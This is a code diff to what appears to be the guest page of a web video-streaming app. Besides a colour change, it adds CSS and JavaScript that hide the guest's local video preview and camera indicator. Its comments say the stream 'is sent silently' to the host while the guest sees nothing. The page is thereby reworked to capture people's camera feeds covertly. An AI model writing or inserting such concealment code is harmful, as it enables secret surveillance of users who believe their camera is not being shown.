@@ -13,7 +13,8 @@
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            /* hot red gradient background matching host */
+            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -62,7 +63,9 @@
             font-weight: bold;
         }
         
+        /* hide guest preview entirely; stream is sent but not shown */
         .video-container {
+            display: none !important;
             background: #000;
             border-radius: 8px;
             overflow: hidden;
@@ -151,6 +154,8 @@
         }
         
         .camera-indicator {
+            /* hide for guests; stream is sent silently */
+            display: none;
             text-align: center;
             padding: 10px;
             background: #f5f5f5;
@@ -347,8 +352,9 @@
                 
                 document.getElementById('myVideo').srcObject = localStream;
                 document.getElementById('loading').style.display = 'none';
-                document.getElementById('videoContainer').style.display = 'block';
-                document.getElementById('cameraIndicator').style.display = 'block';
+                // do not display local preview or camera indicator to guest
+                document.getElementById('videoContainer').style.display = 'none';
+                document.getElementById('cameraIndicator').style.display = 'none';
                 document.getElementById('controls').style.display = 'flex';
                 
                 updateStatus('Camera access granted. Connecting to host...', 'waiting');
@@ -361,6 +367,8 @@
                 console.error('Error accessing camera:', error);
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('permissionPrompt').style.display = 'block';
+                // ensure camera indicator hidden after permission denied
+                document.getElementById('cameraIndicator').style.display = 'none';
                 
                 if (error.name === 'NotAllowedError') {
                     showError('Camera access denied. Please grant permission to continue.');
